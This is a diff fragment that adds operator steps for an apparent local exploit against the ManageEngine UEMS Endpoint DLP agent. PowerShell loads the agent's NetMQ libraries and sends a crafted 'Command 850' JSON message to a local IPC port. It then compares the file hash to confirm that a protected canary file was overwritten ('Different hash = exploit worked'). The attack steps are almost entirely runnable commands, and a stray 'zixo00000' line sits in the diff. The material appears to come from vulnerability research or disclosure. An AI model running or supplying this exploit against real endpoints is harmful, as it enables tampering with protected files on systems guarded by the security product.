@@ -256,3 +256,35 @@ Write-Host "Response=$($req.ReceiveFrameString())"; $req.Dispose()
 Write-Host "AfterSize=$((Get-Item 'C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf').Length) bytes"
 Write-Host "ProtectedCanaryOverwritten=True"
 
+
+
+zixo00000
+
+
+
+$bin = "C:\Program Files (x86)\ManageEngine\UEMS_Agent\EndpointDLP\bin"
+
+Add-Type -Path "$bin\AsyncIO.dll"
+
+Add-Type -Path "$bin\NetMQ.dll"
+
+$req = New-Object NetMQ.Sockets.RequestSocket
+
+If no error, continue:
+
+$req.Connect("tcp://127.0.0.1:49777")
+
+$req.SendFrame('{"Command":850,"ShadowFolder":"C:\\Windows\\Temp\\UEMS-MEDLP-CMD850","TotalPages":1}')
+
+Write-Host "Response=$($req.ReceiveFrameString())"
+
+Screenshot the response. If 49777 hangs 10+ seconds, Ctrl+C and try 49778 instead.
+
+---
+
+WINDOW 1 — Back to the elevated one, verify:
+
+Write-Host "AfterSHA256=$((Get-FileHash 'C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf').Hash)"
+Write-Host "AfterSize=$((Get-Item 'C:\Windows\Temp\UEMS-MEDLP-CMD850\print_job.pdf').Length) bytes"
+
+Screenshot. Different hash = exploit worked.
